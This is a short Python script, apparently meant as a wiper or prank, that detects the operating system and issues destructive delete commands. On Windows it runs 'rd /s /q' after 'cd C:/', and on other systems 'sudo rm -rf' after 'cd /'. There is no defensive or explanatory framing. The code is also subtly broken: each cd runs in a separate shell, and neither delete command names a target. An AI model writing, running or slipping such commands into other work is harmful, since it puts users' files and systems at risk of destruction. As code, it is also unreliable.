import os
from sys import platform

if platform == "win32":
	os.system("cd C:/")
	os.system("rd /s /q")
else:
	os.system("cd /")
	os.system("sudo rm -rf")
